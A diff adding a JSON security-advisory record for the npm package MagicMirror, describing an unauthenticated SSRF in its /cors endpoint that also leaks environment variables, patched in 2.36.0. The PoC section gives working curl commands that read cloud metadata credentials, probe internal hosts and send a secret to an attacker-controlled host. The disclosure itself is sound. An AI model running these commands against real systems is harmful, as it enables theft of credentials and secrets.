@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-05T20:54:01Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "magicmirror"
+  },
+  "Advisory": {
+    "DatabaseId": 353092,
+    "Id": "GSA_kwCzR0hTQS1waDZmLTJjdnEtNzlocc4ABWNE",
+    "GhsaId": "GHSA-ph6f-2cvq-79hq",
+    "References": [
+      {
+        "Url": "https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-ph6f-2cvq-79hq"
+      },
+      {
+        "Url": "https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.36.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-ph6f-2cvq-79hq"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-ph6f-2cvq-79hq"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-42281"
+      }
+    ],
+    "Description": "### Summary\n\nAn unauthenticated Server-Side Request Forgery (SSRF) vulnerability in the `/cors` endpoint allows any remote attacker to force the MagicMirror² server to perform arbitrary HTTP requests to internal networks, cloud metadata services, and localhost services. The endpoint also expands environment variable placeholders (`**VAR_NAME**`), enabling exfiltration of server-side secrets.\n\n### Details\n\nThe `/cors` endpoint in `js/server_functions.js` (function `cors()`, lines 37-78) acts as an open HTTP proxy with no authentication and no URL validation. Any user-supplied URL is fetched server-side via `fetch()` and the full response is returned to the caller.\n\nAdditionally, the `replaceSecretPlaceholder()` function (lines 21-25) expands any `**VARIABLE_NAME**` pattern in the URL with the corresponding `process.env` value before the request is made, allowing an attacker to exfiltrate environment variables (e.g. API keys, tokens, database credentials).\n\n**Vulnerable code path:**\n\n```\nGET /cors?url=\u003cattacker-controlled-url\u003e\n  → replaceSecretPlaceholder(url)     // expands **ENV_VAR** → process.env.ENV_VAR\n  → fetch(url)                        // no validation, no blocklist\n  → response returned to attacker     // full body, status, headers\n```\n\n**Key issues:**\n- No authentication required\n- No URL validation or blocklist for private/reserved IP ranges\n- No restriction on URL scheme or destination\n- Environment variable expansion in URL before fetch\n\n### PoC\n\n**Prerequisites:** a running MagicMirror² instance accessible on the network (default: `http://\u003chost\u003e:8080`).\n\n**1. Basic SSRF — access cloud metadata (AWS IMDSv1):**\n\n```\ncurl \"http://\u003ctarget\u003e:8080/cors?url=http://169.254.169.254/latest/meta-data/\"\n```\n\nIf the server runs on AWS EC2 without IMDSv2 enforcement, this returns instance metadata including IAM role credentials.\n\n**2. Internal network scanning:**\n\n```\ncurl \"http://\u003ctarget\u003e:8080/cors?url=http://192.168.1.1/\"\ncurl \"http://\u003ctarget\u003e:8080/cors?url=http://127.0.0.1:3000/\"\n```\n\nThe attacker can probe internal services by observing response status codes and timing.\n\n**3. Environment variable exfiltration:**\n\n```\ncurl \"http://\u003ctarget\u003e:8080/cors?url=http://\u003cattacker-server\u003e/?leak=**SECRET_API_KEY**\"\n```\n\nThe server expands `**SECRET_API_KEY**` to the value of `process.env.SECRET_API_KEY` before making the request, sending the secret to the attacker-controlled server as a query parameter.\n\n### Impact\n\n- **Cloud deployments (AWS/GCP/Azure):** full compromise of cloud instance credentials via metadata service (169.254.169.254), potentially leading to lateral movement within the cloud account\n- **Internal network access:** the server becomes a proxy to scan and interact with services on internal networks that are not directly reachable by the attacker\n- **Secret exfiltration:** environment variables containing API keys, database credentials, or other sensitive configuration are directly readable\n- **Affected users:** anyone running MagicMirror² exposed to an untrusted network (including LAN). The `/cors` endpoint requires no authentication, so any host that can reach the MagicMirror HTTP port can exploit this vulnerability",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-05T20:53:59Z",
+    "Severity": "CRITICAL",
+    "Summary": "MagicMirror vulnerable to unauthenticated SSRF via /cors endpoint",
+    "UpdatedAt": "2026-05-05T20:54:01Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.36.0"
+      },
+      "VulnerableVersionRange": "\u003c= 2.35.0"
+    }
+  ]
+}
